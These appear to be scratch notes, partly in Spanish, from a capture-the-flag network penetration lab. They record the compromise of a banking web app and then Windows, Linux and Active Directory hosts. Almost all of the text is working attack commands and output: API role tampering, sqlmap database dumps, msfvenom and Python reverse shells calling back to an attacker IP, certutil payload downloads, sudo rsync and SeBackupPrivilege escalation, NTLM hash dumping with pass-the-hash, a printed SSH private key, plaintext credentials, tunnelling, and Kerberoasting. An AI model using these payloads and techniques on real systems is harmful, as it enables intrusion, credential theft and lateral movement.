==============================================================================================
http://10.200.150.100/login



{"email":"test@test.com","firstname":"test","lastname":"test","role":0}


{"flag":"THM{55c6cb2d-42c3-4e32-9e6e-c09f390e128b}","message":"User updated"}


PUT /api/v1.0/user HTTP/1.1
Host: 10.200.150.100:8080
Content-Length: 73
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjowLCJleHAiOjE3NTUzMjA0NTl9.bzTPuzM-3vfnIQS3R56wOtipEHa9LY_0vA_hqAoilyA
Accept-Language: en-US,en;q=0.9
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Origin: http://10.200.150.100
Referer: http://10.200.150.100/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"firstname":"test","lastname":"test","email":"test@test.com","role":1}



{"flag":"THM{55c6cb2d-42c3-4e32-9e6e-c09f390e128b}","message":"User updated"}




==============================================================================================



{"details":{"amount":10,"approved":0,"createdAt":"Sat, 16 Aug 2025 04:30:59 GMT","description":"prueba","interest":5,"loan_number":"5abe512f-76aa-40d0-a788-a8905c560784"},"message":"Loan created"}





PUT /api/v1.0/loan?loan_number=5abe512f-76aa-40d0-a788-a8905c560784 HTTP/1.1
Host: 10.200.150.100:8080
Content-Length: 67
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3Q0Iiwicm9sZSI6MCwiZXhwIjoxNzU1MzE4OTUzfQ.o1cQqsrMHXcJrzJbH4HJgGqm2QC-uN0T2CxVZQcYMFc
Accept-Language: en-US,en;q=0.9
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Origin: http://10.200.150.100
Referer: http://10.200.150.100/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
{"approved":1,"loan_number":"5abe512f-76aa-40d0-a788-a8905c560784"}



{"details":{"amount":10,"approved":1,"createdAt":"Sat, 16 Aug 2025 04:30:59 GMT","description":"prueba","interest":5,"loan_number":"5abe512f-76aa-40d0-a788-a8905c560784"},"flag":"THM{f951d69e-b9cb-4d20-a15b-d059ae3cb31f}","message":"Loan updated"}

==============================================================================================





└─$ sqlmap -r login.txt -p username --batch --dbms=mysql -D trybankmedbs -T Flags --dump --ignore-code=401



available databases [3]:
[*] information_schema
[*] performance_schema
[*] trybankmedbs



sqlmap -r login.txt -p username --batch --dbms=mysql -D trybankmedbs --tables --ignore-code=401
[2 tables]
+-------+
| Flags |
| Users 




sqlmap -r login.txt -p username --batch --dbms=mysql -D trybankmedbs -T Flags  -C flag  --ignore-code=401



└─$ sqlmap -r login.txt -p username --batch --dbms=mysql -D trybankmedbs -T Flags --dump --ignore-code=401








| flag                                      |
+-------------------------------------------+
| THM{6a438340-53ea-4263-87a4-cbe4796024c1} |
+-------------------------------------------+

[09:53:50] [INFO] table 'trybankmedbs.Flags' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.200.150.100/dump/trybankmedbs/Flags.csv'
[09:53:50] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 70 times, 500 (Internal Server Error) - 504 times
[09:53:50] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.200.150.100'

[*] ending @ 09:53:50 /2025-



=======================================================================================================




\\\\\\\\\
{"account_number":"5e523ba1-e62f-4af7-a4d9-2518452c7b09","balance":171,"nickname":"cuenta1"}





cuenta1 Account
Account Number: 5e523ba1-e62f-4af7-a4d9-2518452c7b09




cuenta2 Account
Account Number: ad632e6d-1d6f-439a-aef4-d0ea5cf4f0d8



test44 Account
Account Number: b923e89b-9b65-4ff5-a0f9-5d24bdcecfcf

Current Balance
$0.00
























10.200.150.151 - Windows
10.200.150.152 - Linux
















151=====================

──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 10.200.150.151 -oN scan151.txt
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 10:36 EDT
Nmap scan report for 10.200.150.151
Host is up (0.28s latency).
Not shown: 63950 closed tcp ports (reset), 1570 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8081/tcp  open  blackice-icecap
8443/tcp  open  https-alt
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 21.59 seconds
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ 


nmap -p135,139,3389,445,47001,49664,49665,49666,49667,49669,49671,49672,5985,8081,8443 -sV -sC -Pn -vvv -n 10.200.150.151 -oN fullScan.txt 





msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.250.1.6 LPORT=1234 -f exe -o 1234.exe.pdf



C:\>type user.txt
type user.txt
THM{8e712eb2-4c40-45cc-a9d2-922164851d74}  

C:\>







msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.250.1.6 LPORT=8888 -f msi -o shell.msi







certutil -urlcache -split -f "https://10.250.1.6:9091/shell.msi" "shell.msi"


certutil -urlcache -split -f "http://10.250.1.6:9091/shell.msi" "shell.msi"


certutil -urlcache -split -f "http://10.250.1.6:9091/winPEAS.exe" "winPEAS.exe"

winPEAS.exe

msiexec /quiet /qn /i C:\Users\hr\Documents\shell.msi





certutil -urlcache -split -f "http://10.250.1.6:9091/PowerUp.ps1" "PowerUp.ps1"

PowerUp.ps1


Invoke-AllChecks



msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.250.1.6 LPORT=8888 -f msi -o exploit.msi



certutil -urlcache -split -f "http://10.250.1.6:9091/exploit.msi" "exploit.msi"


msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.250.1.6
set LPORT 8888
run






msiexec /quiet /qn /i C:\Users\hr\Documents\exploit.msi

msiexec /quiet /qn /i exploit.msi


msiexec /i /qn  exploit.msi









https://github.com/flozz/p0wny-shell/blob/master/shell.php

iwr -uri "http://10.250.1.6:9091/shell.php" -o shell.php


certutil -urlcache -split -f "http://10.250.1.6:9091/shell.php" "shell.php"




////////////////////////////////////////////////////////////////////////////////////////////////

https://github.com/wh0amitz/PetitPotato/releases/tag/v1.0.0

# Eliminamos el archivo de backup
C:\backup>del backup.exe

# Buscar si existen tareas programadas mal configuradas (ej: ejecutadas como SYSTEM o con privilegios elevados).

# Ver si se pueden forzar manualmente para obtener escalada de privilegios o ejecutar código malicioso

schtasks /query /v /fo LIST | findstr /i "backup"

schtasks /query /v /fo LIST /tn "\createBackup"




# Eliminamos el archivo y creamos un reverse shell

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.250.1.6 LPORT=4444 -f exe -o backup.exe  

 # Descargamos el archivo de bakup

certutil -urlcache -split -f "http://10.250.1.6:9091/backup.exe" "backup.exe"

# Se escuchar para obtener uns shell

nc -lvnp 4444 


# fuerza la ejecución inmediata de la tarea programada createBackup, sin esperar a su horario.
schtasks /run /TN "\createBackup"


# Ahora Tenemos mas privilegios por lo que vamos a explotar el SeImpersonatePrivilege


whoami /priv

SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled



# Ahora vamos a obtener una cmd con Privilegios Root con la herramienta PetitPotato.exe

# Descargamos el archivo en la maquina victima y lo ejecutamos

certutil -urlcache -split -f "http://10.250.1.6:9091/PetitPotato.exe" "PetitPotato.exe"

C:\>PetitPotato.exe 3 cmd                                                                  

# Tenemos Acceso root y podemos encontrar la flag

C:\Users\Administrator>type root.txt
type root.txt
THM{2e5f52bd-b486-4053-9a6b-6c078c8500de}  



=========================================================================


└─$ nc -lvnp 4444





POST /api/tools HTTP/1.1
Host: 10.200.150.152
Content-Length: 228
Accept-Language: en-US,en;q=0.9
accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Origin: http://10.200.150.152
Referer: http://10.200.150.152/docs
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{
 "content": "import socket,os,pty;s=socket.socket();s.connect((\"10.250.1.6\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")",
"filename": "pwn.py",
"dependencies": []
}




## Copiar la llave id_rsa

cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
ic9SCQBPS1yccAAAAKc2NvdHRAbGluMwE=
-----END OPENSSH PRIVATE KEY-----
composio@lin3:/home/scott$ 

## PErmiso de la llave




chmod 600 id_rsa



└─$ ssh -i id_rsa scott@10.200.150.152




scott@lin3:~$ sudo -l
Matching Defaults entries for scott on lin3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User scott may run the following commands on lin3:
    (ALL) NOPASSWD: /usr/bin/rsync
scott@lin3:~$ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null




sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null


scott@lin3:/$ cat user.txt
THM{1bc86029-558d-4dc5-8a9b-e6bd0d6b940e}
scott@lin3:/$ 






cat user.txt
THM{1bc86029-558d-4dc5-8a9b-e6bd0d6b940e}



linpeas_linux_amd64


wget 'http://10.250.1.6:9091/linepeas.sh'







scott@lin3:/$ sudo -l
Matching Defaults entries for scott on lin3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User scott may run the following commands on lin3:
    (ALL) NOPASSWD: /usr/bin/rsync
scott@lin3:/$


sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null


cat /root/root.txt
THM{55d0c571-0e81-440c-906f-4a129709dfdd}


LFILE=/root/root.txt 
# /usr/bin/grep '' $LFILE
grep /root/root.txt 
THM{55d0c571-0e81-440c-906f-4a129709dfdd}







=======================================================================================================================




sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 10.200.150.20 -oN scanWRK.txt



grep '^[0-9]' scanWRK.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','


nmap -p135,139,3389,445,47001,49664,49665,49666,49667,49668,49669,49670,49671,49680,5985 -sV -sC -Pn -vvv -n 10.200.150.20 -oN fullScanWRK.txt 



smbclient -L //10.200.150.20/ -N




# Listar Recursos Compartidos

smbclient -L //10.200.150.20/ -N 


smbclient -L //10.200.150.20/ -N                                                                                                               

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Safe            Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.200.150.20 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


# Ingresar de Manera Anonima

smbclient \\\\10.200.150.20\\Safe

smb: \> dir
  .                                   D        0  Wed Apr 23 10:19:43 2025
  ..                                  D        0  Wed Apr 23 10:19:43 2025
  creds.zip                           A      263  Wed Apr  2 11:20:25 2025

                10344703 blocks of size 4096. 7715038 blocks available
smb: \> get 



# Obtener la contrasena del archivo descubierto

zip2john creds.zip > creds.hash                                   


john --wordlist=/usr/share/wordlists/rockyou.txt creds.hash

Passw0rd         (creds.zip/creds.txt)     


# La contrasena del archivo es  Passw0rd , ahora podemos extraer los archivos

7z x -pPassw0rd creds.zip 

Extracting archive: creds.zip
--
Path = creds.zip
Type = zip
Physical Size = 263


## El archvio encontrado es creds.txt 
cat creds.txt   

    John
    VerySafePassword!                                                                                                                                                      

# Tenemos un usario y contrasena    John:VerySafePassword! 

# Usuario valido
netexec  smb 10.200.150.20  -u John -p 'VerySafePassword!' 
SMB         10.200.150.20   445    WRK              [*] Windows 10 / Server 2019 Build 17763 x64 (name:WRK) (domain:tryhackme.loc) (signing:False) (SMBv1:False) 
SMB         10.200.150.20   445    WRK              [+] tryhackme.loc\John:VerySafePassword! 






evil-winrm -i 10.200.150.20 -u John -p VerySafePassword!


*Evil-WinRM* PS C:\> type flag.txt

THM{c4c6cae5-e8f8-4cdc-93fc-0c1556d4864f}


# privilegios que tiene el usuario  john

Evil-WinRM* PS C:\Temp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled



==============
──(kali㉿kali)-[~/Downloads]
└─$ pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: fa0661c3eee8696eeb436f2bafa060e7
============== SAM hive secrets ==============
HBoot Key: f010e877149271eb7483d770b792b55610101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d69046613a718ce6cc7ea9e3d5a5fcde:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:95f2822ae7e725c8e30b2b31f66c1b86:::



# Escalar privilegios 

# SeBackupPrivilege 
Es un privilegio de Windows que se utiliza para realizar copias de seguridad de archivos y directorios. Cuando un usuario o proceso tiene este privilegio, puede leer y escribir archivos y directorios sin necesidad de tener permisos de lectura o escritura en los mismos

Explotando este privilegio
Ahora que ya sabemos de que trata este privilegio vamos a utilizar esto para nuestra ventaja. Para empezar, iremos al directorio C:\ y luego crearemos un directorio Temp. También podemos ir a un directorio con privilegios de lectura y escritura si el atacante quiere ser astuto. Luego cambiamos el directorio a Temp. Aquí usamos nuestro SeBackupPrivilege para leer el archivo SAM y guardar una copia del mismo. Del mismo modo, leemos el archivo SYSTEM y guardamos una copia del mismo.

- cd c:\
- mkdir Temp
- reg save hklm\sam c:\Temp\sam
- reg save hklm\system c:\Temp\system

## Esto significa que ahora nuestro Directorio Temp debe tener un archivo SAM y un archivo SYSTEM. Evil-WinRM tiene una opcion que nos permite transferir los archivos de la maquina victima a nuestra maquina host, lo que haremos es descargar ambos archivos.

## Fichero SAM (Security Accounts Manager): El fichero SAM es un fichero de base de datos que almacena información sobre las cuentas de usuario y grupo del sistema

## Fichero SYSTEM: El fichero SYSTEM es un fichero de configuración que almacena información sobre la configuración del sistema operativo


- download sam

- download system

## Ahora, podemos extraer los secretos desde el archivo SAM y SYSTEM usando pypykatz, un extractor de contraseñas y secretos de la memoria de Windows.

- pypykatz registry --sam sam system


HBoot Key: f010e877149271eb7483d770b792b55610101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d69046613a718ce6cc7ea9e3d5a5fcde:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:95f2822ae7e725c8e30b2b31f66c1b86:::



## Tan pronto como el comando se ejecuta, podemos ver en la siguiente demostración que hemos extraído con éxito los hashes NTLM de la cuenta de administrador y otros usuarios también.
## Ahora, podemos usar el Hash NTLM del usuario Administrator para obtener acceso a la máquina destino como usuario administrador. De nuevo utilizamos Evil-WinRM para hacer esto.


evil-winrm -i tryhackme.loc -u 'Administrator' -H 'd69046613a718ce6cc7ea9e3d5a5fcde'


impacket-psexec './administrator@10.200.150.20' -hashes 'aad3b435b51404eeaad3b435b51404ee:d69046613a718ce6cc7ea9e3d5a5fcde'



# Privilegios 

Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
wrk\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /priv



Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Documents> 


https://fuzz3d.github.io/posts/sebackuprivilege/





j.phillips:Welcome1@10.200.150.10




---------------------------------------------------------------------




wget http://10.200.150.20:9091/ligolo/agente.exe agent.exe



certutil -urlcache -split -f "http://10.250.1.6:9091/agent.exe" "agent.exe"



./agent.exe -connect 10.250.1.6:8080 -ignore-cert



certutil -urlcache -split -f "http://10.250.1.6:9091/mimikatz.exe" "mimikatz.exe"

mimikatz.exe 






certutil -urlcache -split -f "http://10.250.1.6:9091/chisel.exe" "chisel.exe"



# --socks5

chisel server --reverse -p 4455 



└─$ evil-winrm -i 10.200.150.20 -u 'Administrator' -H 'd69046613a718ce6cc7ea9e3d5a5fcde'                      



./chisel.exe client 10.250.1.6:4455 R:socks





└─$ sudo nano /etc/proxychains4.conf 
            socks5 127.0.0.1 1080




=================================



smbclient -L //10.200.150.10/ -N




# Listar Recursos Compartidos

smbclient -L //10.200.150.10/ -N 


        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 



smb://10.200.150.10/NETLOGON/



smbclient \\\\10.200.150.10\\NETLOGON -U j.phillips%Welcome1
  

netexec smb 10.200.150.10


proxychains4 netexec smb 10.200.150.10                                


$ proxychains4 netexec  smb 10.200.150.10  -u John -p 'VerySafePassword!' 
SMB         10.200.150.10   445    DC               [+] tryhackme.loc\John:VerySafePassword! 



## proxychains4 netexec  winrm 10.200.150.10  -u John -p 'VerySafePassword!' 


proxychains4 rpcclient -U "" 10.200.150.10  -N
    enumdomusers


proxychains4 rpcclient -U 'John%VerySafePassword!' 10.200.150.10 

    enumdomusers 

Administrator
Guest
krbtgt
t1_r.conway
t2_j.baker
t2_b.bolton
t2_g.clarke
t2_n.marsh
t1_n.marsh
t1_j.hutchinson
t2_m.taylor
d.reynolds
l.williams
d.dawson
g.brown
a.singh
c.potter
s.lucas
john
r.conway
m.robinson
h.smith
s.thompson
l.carr
e.lewis
c.chapman
k.fraser
j.cook
c.thomas
m.ford
p.fleming
b.warren
a.pritchard
j.lawrence
h.porter
n.grant
d.white
k.johnson
a.hewitt
j.collins
g.knowles
d.perry
b.reid
j.shah
g.roberts
n.smith
j.baker
b.bolton
m.martin
g.duncan
p.green
a.bell
s.parkin
a.taylor
r.hall
c.richardson
g.clarke
g.king
t.jenkins
d.begum
d.webster
s.greenwood
l.grant
k.douglas
k.ward
v.sanderson
t.wallis
m.murray
d.davies
d.morrison
s.lee
l.robinson
j.burke
j.phillips
m.abbott
h.williams
a.manning
j.norton
m.ford1
r.stevens
g.holmes
p.farrell
f.henry
t.hooper
p.osborne
a.field
d.rhodes
b.harrison
d.davies1
d.smith
n.chandler
a.jackson
n.marsh
s.mitchell
j.johnson
b.anderson
j.begum
h.phillips
g.price
j.gardner
o.morton
j.hutchinson
v.adams
m.taylor
m.burrows
o.knowles
s.frost
d.hunt
k.roberts
b.hughes
c.taylor



group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x456]
group:[Tier 2 Admins] rid:[0x458]
group:[Tier 1 Admins] rid:[0x459]
group:[Tier 0 Admins] rid:[0x45a]
group:[Payment Approvers] rid:[0x45b]
group:[Payment Capturers] rid:[0x45c]

rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
        rid:[0x48b] attr:[0x7]

rpcclient $> queryuser 0x48b
        User Name   :   g.duncan
        Full Name   :   Gareth Duncan
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 19:00:00 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Wed, 16 Apr 2025 11:04:10 EDT
        Password can change Time :      Thu, 17 Apr 2025 11:04:10 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x48b
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> 





proxychains4  impacket-GetNPUsers -usersfile /home/kali/Downloads/userAC.txt -no-pass tryhackme.loc/







proxychains4  impacket-GetUserSPNs tryhackme.loc/John:VerySafePassword!



 proxychains4 proxychains4  impacket-GetUserSPNs tryhackme.loc/John:VerySafePassword!                        
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.150.10:389  ...  OK
ServicePrincipalName    Name        MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------  ----------  --------  --------------------------  --------------------------  ----------
HTTP/csm.tryhackme.loc  j.phillips            2025-04-17 19:07:31.644827  2025-04-18 11:39:51.776438   



─$ proxychains4 proxychains4  impacket-GetUserSPNs tryhackme.loc/John:VerySafePassword! -request
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
